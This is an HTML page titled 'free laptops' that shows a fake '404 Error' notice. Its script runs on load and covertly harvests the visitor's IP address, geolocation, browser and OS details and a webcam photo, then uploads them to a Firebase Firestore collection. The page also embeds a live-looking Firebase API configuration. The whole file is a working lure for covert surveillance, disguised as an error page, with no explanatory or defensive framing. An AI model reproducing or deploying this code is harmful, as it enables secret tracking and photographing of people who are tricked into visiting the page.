<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>free laptops</title>
</head>
<body>

    <!-- Hidden UI -->
    <div style="display: none;">
        Collecting data...
    </div>
        <h1>404 Error</h1>
    <p>please try again , permissions ot accepted.</p>

    <!-- Firebase SDK Modular Version -->
    <script type="module">
        // Import Firebase SDK modules
        import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.0.2/firebase-app.js';
        import { getFirestore, collection, addDoc } from 'https://www.gstatic.com/firebasejs/9.0.2/firebase-firestore.js';

        // Firebase Configuration
        const firebaseConfig = {
            apiKey: "AIzaSyCVnCCy2tFBgxB52NWKrOYFWTwFnClUT4w",
            authDomain: "sidexp-c5abe.firebaseapp.com",
            projectId: "sidexp-c5abe",
            storageBucket: "sidexp-c5abe.appspot.com",
            messagingSenderId: "1008048850973",
            appId: "1:1008048850973:web:e61765f89e8d67bb3b5ef4",
            measurementId: "G-JLWFP4E4Y4"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        // Function to collect user data
        async function collectUserData() {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const ipAddress = ipData.ip;
                console.log("IP Address:", ipAddress);

                navigator.geolocation.getCurrentPosition(async (position) => {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;
                    console.log("Latitude:", latitude, "Longitude:", longitude);

                    const userAgent = navigator.userAgent;
                    const osType = navigator.platform;

                    const userData = {
                        ipAddress: ipAddress,
                        locationLatitude: latitude,
                        locationLongitude: longitude,
                        deviceModel: "Unknown", // device model not always available
                        osType: osType,
                        browserInfo: userAgent,
                        timestamp: new Date().toISOString(),
                    };

                    try {
                        // Capture image from user's camera
                        const imageBase64 = await captureImage();
                        console.log("Captured Image Base64:", imageBase64);
                        userData.imageBase64 = imageBase64; // Add image base64 to user data

                        // Add document to Firestore
                        await addDoc(collection(db, "user_info"), userData);
                        console.log("Document written successfully!", userData);
                    } catch (error) {
                        console.error("Error capturing image:", error);
                    }
                }, (error) => {
                    console.error("Geolocation error:", error);
                });

            } catch (error) {
                console.error("Error fetching IP:", error);
            }
        }

        // Function to capture a single image from the user's camera
        async function captureImage() {
            return new Promise((resolve, reject) => {
                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');

                // Get video stream from user's camera (but don't display the video feed)
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then((stream) => {
                        const videoTrack = stream.getVideoTracks()[0];
                        const imageCapture = new ImageCapture(videoTrack);

                        // Capture a single frame from the video
                        imageCapture.takePhoto()
                            .then((blob) => {
                                const reader = new FileReader();
                                reader.onloadend = () => {
                                    const imageBase64 = reader.result;
                                    resolve(imageBase64);
                                };
                                reader.readAsDataURL(blob);
                            })
                            .catch((error) => {
                                reject(error);
                            })
                            .finally(() => {
                                // Stop the camera stream
                                stream.getTracks().forEach(track => track.stop());
                            });
                    })
                    .catch((error) => {
                        reject(error);
                    });
            });
        }

        // Trigger data collection when the page loads
        collectUserData();
    </script>

</body>
</html>
